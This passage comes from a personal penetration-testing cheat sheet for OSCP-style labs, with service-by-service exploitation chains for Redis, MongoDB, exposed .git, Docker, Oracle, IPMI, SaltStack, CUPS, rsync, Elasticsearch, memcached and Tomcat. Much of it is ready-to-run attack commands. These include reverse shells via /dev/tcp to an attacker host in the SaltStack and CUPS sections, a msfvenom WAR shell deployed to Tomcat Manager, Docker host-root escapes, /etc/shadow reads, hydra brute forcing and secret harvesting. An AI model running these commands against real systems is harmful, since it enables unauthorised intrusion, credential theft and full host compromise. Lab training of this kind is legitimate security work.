App creds/sessions here → **reuse everywhere** (SSH, web, other services) → `[CREDENTIALS-QUICK]`.

### [AUTH] If it demands a password
```bash
redis-cli -h $IP -a '<password>'            # once you have one (ignore the "insecure" warning)
# find the password:
#  - app config / source / .env  (requirepass is usually reused there)
#  - CONFIG GET requirepass      (if any partial access)
#  - brute (last resort):  nmap -p6379 --script redis-brute $IP   |   hydra -P rockyou.txt redis://$IP
```

### 🧯 Troubleshooting
| Symptom | Meaning / fix |
|---|---|
| `NOAUTH Authentication required` | needs a password → **[AUTH]** |
| `CONFIG SET ... not allowed` / `unknown command 'CONFIG'` | config locked (protected-mode) or commands **renamed** → use **E (Lua)** or just **F (loot)** |
| rogue-server `UnicodeDecodeError('gb18030')` | **known tool bug** — module loaded anyway → `redis-cli` → `MODULE LIST` → `system.exec` |
| `MODULE LOAD` → `unknown command` | version **< 4.0** (no modules) → file-write **B/C/D** instead |
| SSH key written but login fails | wrong `dir` (not that user's home) · key not newline-padded · `.ssh`/perms → try another user |
| webshell written, 404 | wrong web root, or no web server on this box → use **B** (SSH key) |
| `--rhost $IP` "Name or service not known" | `$IP` empty in this tab → use the **literal IP** |

**Leads to:** foothold (RCE / SSH login) → `[LINUX-PRIVESC]`; looted creds → spray `[CREDENTIALS-QUICK]`.

## [ENUM-MONGODB]  Port 27017 — MongoDB — FULL CHAIN
**What it is:** a NoSQL database, **very often with NO authentication.** Main win: **dump collections** → app users/hashes/tokens/API keys → reuse. (No `xp_cmdshell`-style RCE; it's a data-loot service.)

### 🗺️ Decision tree
```
connect (no auth first) → list DBs/collections → dump everything → mine for:
   ├─ password hashes → crack (hashcat) → reuse
   ├─ plaintext creds / API keys / tokens → use directly on web/SSH/etc.
   └─ app logic (admin flags, reset tokens) → IDOR/auth-bypass on the web app
needs auth? → find creds (app config/.env/source) → connect with -u/-p
```

### Steps
```bash
nmap -p27017 -sCV --script "mongodb-info,mongodb-databases" $IP
mongosh --host $IP                      # or older:  mongo $IP   (no creds = unauth ✅)
mongosh "mongodb://$U:$P@$IP:27017"     # with creds
```
Inside the shell:
```javascript
show dbs                                 // list databases
use <db> ; show collections              // list collections
db.<collection>.find().pretty()          // dump a collection (users, sessions, config)
db.getSiblingDB('<db>').<coll>.find()     
// dump EVERYTHING fast:
db.adminCommand('listDatabases').databases.forEach(d => print(d.name))
```
Mine for `password`, `hash`, `token`, `apikey`, `secret` → crack/reuse → `[CREDENTIALS-QUICK]`.

### 🧯 Troubleshooting
| Symptom | Fix |
|---|---|
| `command listDatabases requires authentication` | needs creds → find them in app config/.env/source |
| `mongosh` not installed | use legacy `mongo $IP`, or `apt install mongodb-mongosh` |
| connection refused remotely | bound to localhost → reach it from a foothold/tunnel |

**Leads to:** app creds/tokens → reuse/spray `[CREDENTIALS-QUICK]`; data → web auth-bypass.

## [ENUM-GIT]  an exposed `.git` folder over HTTP — FULL CHAIN  → `[FOUND-GIT]`
**What it is:** a web server exposing a `.git/` directory leaks the **entire source tree + its full history**. History is the prize: it holds **passwords, API keys, DB strings, private keys, and endpoints** that developers "deleted" in a later commit but that live forever in old commits. Finding `.git` = you basically have the app's source and its secrets.

### 🗺️ Decision tree
```
gobuster/feroxbuster finds /.git/ (or /.git/HEAD returns "ref: refs/heads/...") →
  directory listing ON (you can browse /.git/)?  → wget -r the whole thing
  directory listing OFF (403 on /.git/ but /.git/HEAD downloads)? → git-dumper (rebuilds repo from objects)
  →  once you have a local repo:
       git log --all -p           → read EVERY change across ALL branches → grep for secrets
       git show <deleted-commit>  → recover files removed in a later commit
       git stash list / git branch -a → hidden work / other branches
  found creds?        → reuse on SSH / app login / DB  → [CREDENTIALS-QUICK]
  found source only?  → read it for auth bypass / SQLi / upload bugs → [WEB-QUICK]
  found a private key / .env / config? → SSH in or hit the DB directly
```

### Step 1 — confirm it's really there
```bash
curl -s http://$IP/.git/HEAD                 # "ref: refs/heads/master" = exposed .git (the #1 tell)
curl -s http://$IP/.git/config               # often shows the remote URL + sometimes creds in the URL
# in a dir brute you'll see:  /.git/  /.git/HEAD  /.git/config  /.git/logs/HEAD
```

### Step 2 — pull the whole repo down
```bash
# Preferred — works even when directory listing is OFF (reconstructs from pack/loose objects):
git-dumper http://$IP/.git ./loot            # [LOOK-UP] pipx install git-dumper   (or: pip3 install git-dumper)
# Fallback if browsing /.git/ is allowed (listing ON):
wget -r -np -R "index.html*" http://$IP/.git/ -P ./loot      # mirror, then:  cd loot/$IP ; git checkout -- .
```

### Step 3 — mine history + working tree for secrets (the actual attack)
```bash
cd ./loot
git log --all --oneline                      # every commit on every branch — look at the messages
git log --all -p | grep -iaE 'pass|passwd|secret|api[_-]?key|token|aws|BEGIN .*PRIVATE KEY|mysql|postgres|connectionstring'
git show <commit>                            # read a specific interesting commit in full
git show <commit>:path/to/file               # pull a file AS IT WAS in that commit (recover "deleted" secrets)
git stash list && git stash show -p          # devs sometimes stash creds
git branch -a                                # dev/staging branches often have test creds hard-coded
git diff <old>..<new> -- config/             # see what a "cleanup" commit removed
```

### 🧯 Troubleshooting
| Symptom | Fix |
|---|---|
| `/.git/` → 403 but `/.git/HEAD` downloads | listing is off — use **git-dumper**, not wget |
| git-dumper errors / partial repo | server blocks `.pack` → still try `git log` / `git checkout -- .`; some objects enough |
| `fatal: not a git repository` after wget | you only grabbed HTML — re-mirror, confirm real objects in `.git/objects/`, then `git checkout -- .` |
| repo clean, no secrets in current files | **you didn't check history** → `git log --all -p` (deleted files live in old commits) |
| found a remote URL with `user:pass@` in `.git/config` | that's a credential → reuse it everywhere |
| `.git` on a *Windows*/IIS box | same method; also check `/.svn/`, `/.hg/`, `/.bzr/` the same way |

**Leads to:** hard-coded creds → `[CREDENTIALS-QUICK]` (reuse on SSH/app/DB) · private key/.env → direct login · readable source → audit for `[WEB-QUICK]` bugs (SQLi, auth bypass, file upload). An exposed `.git` is one of the highest-yield web findings — **always** dump and read the full history.

## [ENUM-DOCKER]  Ports 2375/2376 (exposed API) OR you land inside a container — FULL CHAIN
**What it is:** Docker runs containers as **root on the host**. Two separate situations, both → host root: **(A)** the Docker daemon's **remote API** is exposed on **2375 (plaintext)** / **2376 (TLS)** with no auth → you control the daemon from your Kali. **(B)** your shell is **inside a container** → you look for a way to break out to the host. The winning move in both is the same idea: **start/enter a container that mounts the host's `/` and chroot into it** = you're root on the real machine.

### 🗺️ Decision tree
```
Port 2375/2376 open externally?
  └ docker -H tcp://$IP:2375 version  works (no auth)? → run alpine with -v /:/host → chroot → HOST ROOT ✅
You have a shell INSIDE a container? (check: /.dockerenv exists, hostname is a 12-hex string, `cat /proc/1/cgroup` shows /docker/)
  ├ /var/run/docker.sock readable?        → talk to the daemon → run a privileged mount container → HOST ROOT ✅
  ├ container is --privileged? (capsh --print shows cap_sys_admin, or fdisk -l lists host disks) → mount /dev/sdaN → HOST FS ✅
  ├ dangerous capability (CAP_SYS_ADMIN / CAP_DAC_READ_SEARCH)? → cgroup-release-agent / shocker escape
  ├ host path mounted in (df -h / mount shows a host dir, often /opt, /home, /root)? → read/write host files
  └ nothing escapes? → treat it as a normal host: loot env vars, [LINUX-PRIVESC] inside, pivot to other containers (same subnet)
```

### Situation A — exposed Docker API (2375/2376)
```bash
nmap -p2375,2376 -sV $IP                                 # "Docker" / an HTTP API on 2375
curl -s http://$IP:2375/version | jq .                   # no auth → prints daemon version = you own it
export DOCKER_HOST=tcp://$IP:2375                         # now plain `docker` commands hit the target
docker ps ; docker images                                # see what's running / available images
# ── the kill shot: mount the HOST's root fs into a throwaway container, chroot in = root on the host ──
docker run -v /:/host --rm -it alpine chroot /host sh
#   inside: id → root ; now read /host(=/)… e.g. cat /root/proof.txt, add SSH key, drop a SUID, etc.
# no 'alpine' image present? use whatever `docker images` shows:
docker run -v /:/host --rm -it <existing_image> chroot /host sh
# 2376 is TLS — needs client certs; if you have them: docker --tlsverify -H tcp://$IP:2376 ...
```

### Situation B — you're inside a container, break out
```bash
# 1) Confirm you're containerised + how:
ls -la /.dockerenv ; cat /proc/1/cgroup | grep -i docker ; hostname        # 12-hex hostname = container
# 2) The docker.sock jackpot (container can talk to the host daemon):
ls -la /var/run/docker.sock
docker -H unix:///var/run/docker.sock run -v /:/host --rm -it alpine chroot /host sh   # host root
#   (no docker client in the container? curl the sock:  curl -s --unix-socket /var/run/docker.sock http://localhost/images/json )
# 3) Privileged container (full caps, host devices visible):
capsh --print | grep -i sys_admin           # cap_sys_admin present = privileged
fdisk -l                                     # you can SEE host disks (/dev/sda…) → mount them:
mkdir /mnt/host && mount /dev/sda1 /mnt/host && chroot /mnt/host sh      # host filesystem
# 4) Host dir mounted in → just read/write it:
mount | grep -vE 'proc|sys|cgroup|tmpfs'     # spot a bind-mounted host path (e.g. /opt, /home)
# 5) Loot regardless: env holds secrets in containers
env | grep -iE 'pass|secret|key|token|_db_'  ;  cat /proc/1/environ | tr '\0' '\n'
```

### 🧯 Troubleshooting
| Symptom | Fix |
|---|---|
| `docker ... :2375` → `Cannot connect` | API not exposed/filtered → not this path; (2376 is TLS, needs certs) |
| no `alpine` image for the mount trick | use an image from `docker images` / `docker -H ... images`; any Linux image works for chroot |
| inside container, `docker` command not found | talk to the socket with curl: `curl --unix-socket /var/run/docker.sock http://localhost/containers/json` |
| `/var/run/docker.sock` not present/readable | no easy sock escape → check `capsh --print` (privileged) and `fdisk -l` (host disks) instead |
| mounted but `chroot: cannot run sh` | try `chroot /host /bin/bash`; or just read files directly under `/host/...` (no chroot needed to read) |
| not sure if you're even in a container | `cat /proc/1/cgroup` shows `/docker/<id>`; `/.dockerenv` exists; hostname = short hex |

**Leads to:** **host root** (A: exposed API; B: docker.sock or privileged escape) → read `/root/proof.txt`, plant SSH key, or `[LINUX-PRIVESC]` on the host. If no escape, treat the container as a host, loot its env/secrets, and **pivot** to neighbouring containers on the same Docker bridge subnet. (Related: LXD group escape → see `[LINUX-PRIVESC]`.)

## [ENUM-ORACLE]  Port 1521 — Oracle Database (TNS) — FULL CHAIN
**What it is:** an Oracle database with its own tooling. Path: find a valid **SID** (database name) → log in with **default creds** → read/write files or command exec.
### 🗺️ Decision tree
```
1521 open → guess the SID (odat sidguesser / nmap oracle-sid-brute) →
   got SID → guess default creds (scott/tiger, system/manager, sys/change_on_install) →
      creds work → odat: utlfile (write file→RCE) / externaltable (run command) / read files
      no creds   → brute with odat passwordguesser
   no SID → tnscmd10g version ; brute harder
```
```bash
sudo apt install oracle-instantclient  # if sqlplus/odat aren't installed
nmap -p1521 -sV --script "oracle-tns-version,oracle-sid-brute" $IP   # version + guess the SID
odat sidguesser -s $IP -p 1521                     # brute-force the SID (the database name)
odat passwordguesser -s $IP -p 1521 -d <SID>       # guess default username/passwords for that SID
tnscmd10g version -h $IP                            # query the TNS listener directly
sqlplus <user>/<pass>@$IP:1521/<SID>               # log in once you have creds
odat utlfile -s $IP -d <SID> -U <user> -P <pass> --putFile C:\\ shell.exe local.exe   # upload a file (→ RCE)
odat externaltable -s $IP -d <SID> -U <user> -P <pass> --exec C:\\ "whoami"           # run an OS command
odat all -s $IP -d <SID> -U <user> -P <pass>                                           # try every attack at once
```
### 🧯 Troubleshooting
| Symptom | Fix |
|---|---|
| `ORA-12505` listener refused | wrong/unknown SID → brute it (`odat sidguesser`) |
| `ORA-01017` invalid username/password | wrong creds → `odat passwordguesser` |
| sqlplus/odat missing | `sudo apt install odat` / oracle-instantclient |
| TNS poisoning / version only | `tnscmd10g version -h $IP` to fingerprint |
**Where it leads:** with creds → file read/write + command exec as the Oracle service account (often high-priv on Windows → **SeImpersonate → SYSTEM**). Default creds are the usual foothold.

## [ENUM-VNC]  Port 5900(+) — VNC (remote desktop) — FULL CHAIN
**What it is:** cross-platform graphical remote desktop. Weak/blank passwords are common; some versions have an **auth bypass**; a found `.vnc` password file can be **decrypted**; the session is often an already-logged-in (sometimes admin) desktop.
### 🗺️ Decision tree
```
5900+ open → auth-bypass vuln (realvnc CVE-2006-2369)? → connect free
   found a *.vnc / passwd file (on another box/share)? → decrypt it (vncpwd) → connect
   blank/weak pw? → vncviewer / brute (hydra) → connect
   → land on a desktop (often privileged) → read screen / open a terminal
```
```bash
nmap -p5900 --script "vnc-info,realvnc-auth-bypass,vnc-title" $IP   # info + CVE-2006-2369 auth bypass check
vncviewer $IP                                       # connect (prompts for the VNC password)
vncviewer $IP -passwd /path/to/vnc.passwd           # use a captured .vnc password file
# crack a captured VNC password file:  vncpwd vnc.passwd   (or the 'vncdec' tools)
hydra -P rockyou.txt vnc://$IP                       # brute the password (last resort)
```
### 🧯 Troubleshooting
| Symptom | Fix |
|---|---|
| "Authentication failure" | wrong pw → crack a looted `.vnc` file (`vncpwd`) or brute |
| black/grey screen | server busy / wrong resolution → retry, or `vncviewer -FullColor` |
| ports 5901/5902 instead | display :1/:2 → VNC port = 5900 + display number |
**Where it leads:** a graphical session (often an already-logged-in, sometimes admin, user) → open a terminal → `[LINUX-PRIVESC]` / `[WINDOWS-PRIVESC]`.

## [ENUM-IPMI]  Port 623/UDP — IPMI (server management) — FULL CHAIN
**What it is:** a "lights-out" management interface on server hardware. Its big weakness: **IPMI 2.0 will hand you a password hash for any valid user before you even authenticate** (CVE-2013-4786) → crack it offline.
### 🗺️ Decision tree
```
623/udp open (remember: -sU!) → check cipher-zero + version →
  cipher-zero bypass works? → ipmitool -C 0 → list/add users, no password needed → admin
  else → dump the RAKP hash (MSF ipmi_dumphashes) →
     hash cracks (hashcat -m 7300)? → you have controller admin creds →
        REUSE those creds on the OS (SSH/web/SMB) → [CREDENTIALS-QUICK]
     won't crack → try DEFAULT creds (ADMIN/ADMIN, root/calvin, admin/admin) →
        work → admin ; none → this box isn't the IPMI path, move on
```
```bash
nmap -sU -p623 --script ipmi-version,ipmi-cipher-zero $IP     # detect + check for the cipher-zero auth bypass
# dump password hashes (Metasploit — your ONE MSF box, or just to grab the hash):
#   use auxiliary/scanner/ipmi/ipmi_dumphashes    → gives a hashcat -m 7300 (RAKP) hash
hashcat -m 7300 ipmi.hash rockyou.txt                # crack the captured RAKP hash
# default creds to try: ADMIN/ADMIN, root/calvin (Dell), admin/admin, root/root
```
### 🧯 Troubleshooting
| Symptom | Fix |
|---|---|
| nmap shows nothing on 623 | it's **UDP** → `nmap -sU -p623` |
| cipher-zero works | `ipmitool -I lanplus -C 0 -H $IP -U Administrator -P '' user list` → auth-bypass (set a password / dump users) |
| RAKP hash won't crack | strong pw → try default creds instead; or this box isn't the IPMI path |
**Where it leads:** admin creds for the management controller → often creds reused for the OS → `[CREDENTIALS-QUICK]`.

## [ENUM-SALTSTACK]  Ports 4505/4506 — SaltStack salt-master — FULL CHAIN
**What it is:** SaltStack is a config-management tool. Its **salt-master** talks to minions (agents) over **ZeroMQ**: **4505** = publish bus, **4506** = request/return. Seeing **both** open — nmap prints `zmtp` / `ZeroMQ ZMTP 2.0` — is the dead giveaway. A **salt-api** (REST) often runs alongside, commonly on **:8000** or **:8080** returning JSON. **Key fact: the salt-master process runs as ROOT.** So a working exploit = **instant root, zero privesc.** This is one of the few services where enumeration and game-over are the same step.

### 🗺️ Decision tree
```
4505 AND 4506 open (zmtp)? → it's SaltStack →
  fingerprint version → vulnerable to CVE-2020-11651/11652? (Salt < 2019.2.4 or < 3000.2 — most lab boxes are)
    ├ YES → run the PoC:
    │        --read <file>  → grab /root/proof.txt or /etc/shadow instantly (returns content)   ← fastest flag
    │        --exec <cmd>   → BLIND command exec as root → send a reverse shell → full root shell ✅
    └ unsure/patched → check salt-api (:8000) for CVE-2021-25281/25282/25283 (auth bypass → SSRF/RCE)
  only one of 4505/4506 visible? → still probe; firewalling can hide one. Confirm with the PoC's check.
```

### Step 1 — identify + fingerprint
```bash
nmap -p4505,4506 -sV $IP                 # "ZeroMQ ZMTP 2.0" on BOTH = salt-master
nmap -p8000,8080 -sV $IP                 # salt-api often here (CherryPy / JSON)
curl -sk https://$IP:8000/ -H 'Accept: application/json'   # salt-api banner if present
```

### Step 2 — CVE-2020-11651 (auth bypass) + CVE-2020-11652 (path traversal) → UNAUTH RCE as root
```bash
# Vulnerable: Salt < 2019.2.4 / < 3000.2  (the common lab version)
git clone https://github.com/jasperla/CVE-2020-11651-poc && cd CVE-2020-11651-poc
pip3 install salt msgpack --break-system-packages        # the PoC imports the salt lib
python3 exploit.py --master $IP --check                  # confirm vulnerable first
# ── quickest flag: read any file as root (prints the content back) ──
python3 exploit.py --master $IP --read /root/proof.txt
python3 exploit.py --master $IP --read /etc/shadow       # then crack, or just read flags
# ── full root shell: --exec is BLIND, so fire a reverse shell ──
# Kali:  nc -lvnp 443
python3 exploit.py --master $IP --exec "bash -c 'bash -i >& /dev/tcp/<KALI>/443 0>&1'"
#   → lands a shell as root. Stabilise (python pty) → cat /root/proof.txt
```

### 🧯 Troubleshooting
| Symptom | Fix |
|---|---|
| PoC: `ImportError: salt` | `pip3 install salt msgpack --break-system-packages` (the exploit needs the real salt lib) |
| `--exec` shows no output | it's **blind by design** — it schedules a job silently → use `--read` for files, or `--exec` a **reverse shell** to get interactivity |
| `--check` says not vulnerable | version patched → pivot to **salt-api** CVE-2021-25281/-25282/-25283 (needs :8000 up), or this isn't the path |
| reverse shell doesn't land | wrong KALI IP/port, or egress filtered → try a common port (443/80), confirm `nc` is listening, URL-encode nothing (it's exec not web) |
| both ports open but PoC times out | master behind a firewall for publish bus → still try `--read` (uses 4506); or salt-api route |
| msgpack/python version clash | use a venv, or an older PoC fork; the vuln is in the master, not your client |

**Leads to:** **root** — either directly (`--read` the flag / shadow) or via an `--exec` reverse shell. No privilege escalation needed. First box where this appears in your journal: PG **Twiggy** (`OSCP-Challenge-Labs/Twiggy.md`).

## [ENUM-CUPS]  Port 631 (+ 5353/UDP mDNS) — CUPS (Linux printing) — FULL CHAIN
**What it is:** CUPS is the Linux printing stack, speaking **IPP** over **631/TCP** (and advertising via **mDNS on 5353/UDP**). Two things to care about: **(1)** the web admin on `http://$IP:631` can leak printer configs, device URIs, and sometimes **creds**; **(2)** the late-2024 chain **CVE-2024-47176 / -47076 / -47175 / -47177** → **unauthenticated RCE** when `cups-browsed` (UDP 631) is listening: you make the target add an attacker-controlled "printer", then a print job to it runs your command. Real and serious, but **rare on current OSCP** — know it, don't fixate.

### 🗺️ Decision tree
```
631 open →
  browse http://$IP:631 → Administration / Printers pages →
    ├ printer config leaks a device URI with user:pass@ , or a backend script path → loot creds / read script
    ├ can you add/modify a printer (admin reachable)? → classic trick: set a printer backend to a command → print → runs it
  cups-browsed on UDP 631 reachable (nmap -sU)? AND version in the 2024-vuln range? →
    └ evil-cups chain → rogue printer → user prints (or you trigger) → RCE as the print context (often lp/root-ish)
  nothing exploitable? → 631 is frequently a DISTRACTION (e.g. PG Pelican) → note it, move on
```

### Step 1 — identify + browse
```bash
nmap -p631 -sCV $IP                      # "CUPS x.y (IPP)"
nmap -sU -p631 $IP                       # is cups-browsed (UDP) also up? (needed for the 2024 RCE)
curl -s http://$IP:631/ | grep -i cups   # version string
# Open it in a browser (your KB browser): http://$IP:631  → Printers, Jobs, Administration
#   look at each printer's "Device URI" — may contain user:pass@host or a backend command/script
```

### Step 2 — classic path: config/creds + command-backend
```bash
curl -s "http://$IP:631/printers/"                    # list printers
curl -s "http://$IP:631/admin/"                       # admin page (often needs auth; try default/looted creds)
# IPP creds, if any, sit in: /etc/cups/printers.conf , /etc/cups/cupsd.conf (read via another vuln/LFI if you get file read)
# If you can add/edit a printer (admin access), a device-URI pointing at a command backend runs as the CUPS user.
```

### Step 3 — CVE-2024-4717x unauth RCE (only if cups-browsed/UDP 631 + vulnerable version)
```bash
# IppSec's PoC: https://github.com/ippsec/evil-cups
git clone https://github.com/ippsec/evil-cups && cd evil-cups
python3 evil-cups.py <KALI-IP> $IP "bash -c 'bash -i >& /dev/tcp/<KALI-IP>/443 0>&1'"
#   → registers a rogue printer on the target; RCE fires when a print job hits it
#   (Kali: nc -lvnp 443). Needs cups-browsed listening on UDP 631 and a vulnerable CUPS.
```

### 🧯 Troubleshooting
| Symptom | Fix |
|---|---|
| 631 open but web admin asks for auth | try looted/default creds; otherwise you likely can't modify printers → not the path |
| evil-cups does nothing | **UDP 631 (cups-browsed) must be reachable** (`nmap -sU -p631`) AND version in range — often it isn't on OSCP |
| RCE "fires when a job prints" but no job comes | some PoCs let you self-trigger; otherwise it needs a victim to print → unreliable on a solo lab |
| only TCP 631, patched CUPS | treat 631 as a **distraction** (very common) — don't sink time; re-focus on web/other services |
| want creds from configs but no file read | you need an LFI/other foothold first; 631 alone rarely gives file read |

**Leads to:** rarely the main path on OSCP. Best realistic yield = **creds leaking from a printer's device URI / config** → `[CREDENTIALS-QUICK]`. The 2024 RCE is powerful but needs UDP cups-browsed + a vulnerable version + (usually) a printing victim — so **recognise it, try it if the pieces fit, but don't marry it.** On boxes like PG Pelican, 631 was pure noise.

## [ENUM-TELNET]  Port 23 — Telnet (cleartext remote login) — FULL CHAIN
**What it is:** ancient remote shell, **cleartext**. Occasionally wide open with default/no creds, or the banner leaks the device/OS.
### 🗺️ Decision tree
```
23 open → read the banner (telnet $IP 23) →
  banner names a device/OS/product? → try its DEFAULT creds (root/blank, admin/admin, vendor defaults) →
     login works?  → you have a shell → stabilize → loot → [LINUX-PRIVESC]
     no default?   → is the product/version exploitable? ([VERSION-VULN-MAP]) → yes: run it
  no banner / no default → do you KNOW a username (from finger/SMTP/web)? →
     yes → brute just that user (hydra, slow) → login
     no  → telnet is a dead end here; move on (don't full-rockyou-brute blind)
  ANY password you find → REUSE on SSH/SMB/other (cleartext = easy capture)
```
```bash
nmap -p23 -sCV --script "telnet-ntlm-info,telnet-encryption" $IP
telnet $IP 23                      # read banner; try: root/(blank), admin/admin, device defaults
hydra -l <user> -P rockyou.txt telnet://$IP -t 4    # brute (last resort, KNOWN user only)
```
- **Leads to:** a shell → `[LINUX-PRIVESC]`; creds → `[CREDENTIALS-QUICK]`.

## [ENUM-FINGER]  Port 79 — Finger (user info) — FULL CHAIN
**What it is:** leaks **usernames + who's logged in**. Pure user-enumeration (feeds spraying/SSH).
### 🗺️ Decision tree
```
79 open → finger @$IP (list logged-in users) →
  got usernames? → build a user list →
     feed it to: AS-REP/Kerberoast (if AD), password spray, SSH guessing → [CREDENTIALS-QUICK]
  empty / filtered? → brute common names (root/admin/bin/daemon/<site names>) →
     still nothing → old Solaris trick: finger 'a b c d e f g h'@$IP (dumps all) →
     still nothing → note it, move on
```
```bash
finger @$IP ; finger root@$IP                        # list users / query one
for u in root admin bin daemon <names>; do finger $u@$IP; done   # brute usernames
# metasploit: auxiliary/scanner/finger/finger_users  (or finger-user-enum.pl)
```
- **Leads to:** a user list → spray / SSH-guess `[CREDENTIALS-QUICK]`.

## [ENUM-TFTP]  Port 69/UDP — TFTP (trivial file transfer, NO auth) — FULL CHAIN
**What it is:** UDP file transfer with **no authentication** — GET/PUT files if you know (or guess) the name. Routers/VoIP store configs here (which hold creds). TFTP **can't list**, so you must guess names.
### 🗺️ Decision tree
```
69/udp open → try to GET a known/guessed config name →
  GET works? → loot the config for creds/keys → REUSE → [CREDENTIALS-QUICK]
  GET fails? → brute common names (nmap tftp-enum; try running-config, startup-config,
               *.conf, backup, sysconfig) →
     found one → loot it
     none → can you PUT? →
        yes + you know a useful path (web root / tftp root) → stage a webshell/file → foothold
        no  → TFTP is a dead end here; move on
```
```bash
nmap -sU -p69 -sV $IP ; nmap -sU -p69 --script tftp-enum $IP
tftp $IP                           # then:  get <file>  /  put <file>
#   common grabs: running-config, startup-config, *.conf, backup — often contain creds
```
- **Leads to:** config creds → reuse; writable + known path → foothold (rare).

## [ENUM-NTP]  Port 123/UDP — NTP (time) — FULL CHAIN
**What it is:** time service. Minor on OSCP, but two real uses: leaks internal **hosts** (monlist) and gives the DC's **time** (fixes Kerberos clock skew).
### 🗺️ Decision tree
```
123/udp open → ntpq peers / ntp-monlist →
  monlist returns IPs? → those are internal hosts → note them for PIVOT targets
  doing AD and hitting KRB_AP_ERR_SKEW? → sudo ntpdate $IP to sync your clock → retry Kerberos
  nothing useful → note + move on (NTP is rarely the path itself)
```
```bash
nmap -sU -p123 --script "ntp-info,ntp-monlist" $IP
ntpq -c readlist $IP ; ntpq -c peers $IP              # peers may reveal internal IPs
sudo ntpdate $IP                                      # sync your clock to it (for Kerberos)
```
- **Leads to:** internal host hints (pivot); clock sync for `[ENUM-KERBEROS]`.

## [ENUM-RSYNC]  Port 873 — rsync (file sync, often NO auth) — FULL CHAIN
**What it is:** file-sync daemon. Frequently exposes **modules (shares)** with no auth → read/write files (configs, keys, web root, even `/`).
### 🗺️ Decision tree
```
873 open → list modules (rsync --list-only rsync://$IP/) →
  modules listed? →
     readable? → DOWNLOAD it → mine for creds/keys/source → [CREDENTIALS-QUICK]
     writable? AND maps a useful path? →
        maps web root  → upload a webshell → browse it → RCE
        maps a home    → upload ~/.ssh/authorized_keys → ssh in
        maps /         → read /etc/shadow, or write a cron/SUID → root
  module needs auth? → try creds you already have (rsync://user@$IP/<module>/)
  no modules → move on
```
```bash
nmap -p873 -sV --script "rsync-list-modules" $IP
rsync -av --list-only rsync://$IP/                    # list modules (shares)
rsync -av rsync://$IP/<module>/ ./loot/               # DOWNLOAD → loot
rsync -av ./shell.php rsync://$IP/<module>/           # UPLOAD (if writable)
rsync -av rsync://$IP/<module>/etc/shadow ./          # if a module maps '/', read anything
```
- **Leads to:** creds/keys → `[CREDENTIALS-QUICK]`; writable share → shell `[WEB-UPLOAD]`.

## [ENUM-ELASTIC]  Ports 9200/9300 — Elasticsearch / Kibana — FULL CHAIN
**What it is:** a search/analytics DB with a **REST API, usually no auth**. Loot indices (app data/creds); old versions have **RCE**.
### 🗺️ Decision tree
```
9200 open → curl http://$IP:9200 → read the VERSION →
  version ≤ 1.1    → CVE-2014-3120 RCE (searchsploit elasticsearch)
  version 1.3–1.4  → CVE-2015-1427 Groovy-sandbox RCE
  version newer / unsure → no easy RCE → LOOT instead:
     list indices (_cat/indices) → dump each (_search) → mine for creds/tokens/app data → REUSE
  Kibana on 5601?  → check ITS version too (CVE-2018-17246 LFI→RCE on old Kibana)
```
```bash
curl -s http://$IP:9200                               # banner → VERSION (decides RCE)
curl -s http://$IP:9200/_cat/indices?v                # list indices
curl -s "http://$IP:9200/_search?pretty&size=100"     # dump data → mine for creds/tokens
# RCE: ES ≤1.1 → CVE-2014-3120 ; ES 1.3-1.4 → CVE-2015-1427 (Groovy)  [LOOK-UP searchsploit elasticsearch]
```
- **Leads to:** app creds → reuse; old version → RCE `[EXPLOIT-RESEARCH]`.

## [ENUM-MEMCACHED]  Port 11211 — Memcached (cache, NO auth) — FULL CHAIN
**What it is:** in-memory cache, usually **no auth**. Dump cached objects → **session tokens, creds, app data**.
### 🗺️ Decision tree
```
11211 open → connect (nc $IP 11211) → stats items → stats cachedump <slab> 0 (list keys) →
  keys present? → get <key> each (or memcdump/memccat to dump ALL) →
     found a session token? → replay it in the app (cookie) → authenticated
     found creds / app data? → REUSE → [CREDENTIALS-QUICK]
  empty cache → note + move on
```
```bash
nmap -p11211 -sV --script "memcached-info" $IP
nc -nv $IP 11211            # then: stats / stats items / stats cachedump <slab> 0 / get <key>
memcdump --servers=$IP | while read k; do echo "$k:"; memccat --servers=$IP "$k"; done   # dump all
```
- **Leads to:** cached creds/sessions → reuse `[CREDENTIALS-QUICK]`.

## [ENUM-AJP]  Port 8009 — AJP / Apache Tomcat (Ghostcat) ; Tomcat on 8080 — FULL CHAIN
**What it is:** **AJP (8009)** is Tomcat's binary connector → **Ghostcat (CVE-2020-1938)** reads any file in the webapp (e.g. `WEB-INF/web.xml` with creds), sometimes RCE. **Tomcat on 8080** → the **Manager app** deploys a `.war` = RCE.
### 🗺️ Decision tree
```
8009 (AJP) open? → Ghostcat (CVE-2020-1938) → read WEB-INF/web.xml →
  web.xml leaks Manager creds? → go to the 8080 branch with them
  no creds there → read other app files for secrets
8080 (Tomcat) open? → browse / → find version + /manager/html →
  Manager reachable? → try creds (web.xml-looted, or defaults tomcat/tomcat, admin/admin, tomcat/s3cret) →
     login works? → deploy a malicious .war → browse it → RCE (reverse shell) ✅
     no creds     → brute Manager (hydra http-get) OR Ghostcat-read web.xml first
  no Manager → searchsploit the Tomcat version for a version-specific bug
```
```bash
# AJP / Ghostcat (8009):
nmap -p8009 -sV $IP
#   python3 ghostcat.py -p 8009 $IP -f WEB-INF/web.xml        → creds/config  (searchsploit ghostcat)
# Tomcat Manager (8080):
curl -s http://$IP:8080/                                       # version in the error/title page
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<KALI> LPORT=443 -f war -o sh.war
curl -u tomcat:<pass> --upload-file sh.war "http://$IP:8080/manager/text/deploy?path=/sh"
curl "http://$IP:8080/sh/"                                      # triggers the shell (nc -lvnp 443)
```
- **Leads to:** file read (creds) → Manager → `.war` deploy → shell.

## [ENUM-UNUSUAL-PORTS]  a generic method for any port you don't recognise
When you meet an unknown port, work through these:
1. `nc -nv $IP <port>` → grab the banner; try sending a newline, then `HELP`, then `GET / HTTP/1.0`.
2. `nmap -p<port> -sCV --version-intensity 9 $IP` → force harder version detection.
3. Google the banner/version text + "exploit" or "default credentials".
4. Try it as web (`curl`), then as TLS (`openssl s_client -connect $IP:<port>`), then with the service's own client.
5. `searchsploit <product>`. **Treat every listening port as a possible way in.**

---

# [VERSION-VULN-MAP]  "I see version X — is it exploitable, and WITH WHAT?"

> **Why this section exists:** knowing "Redis ≥ 4.0" is useless if you don't know it's **RCE-able** and that a tool called **`redis-rogue-server`** exists. This is the missing half: for every service, the **vulnerable version → CVE/name → what you get → the EXACT tool/PoC and how to find it.** When `nmap -sCV` prints a version, come here.

## 🧠 First — the META-METHOD (how you'd *ever* discover an exploit exists)
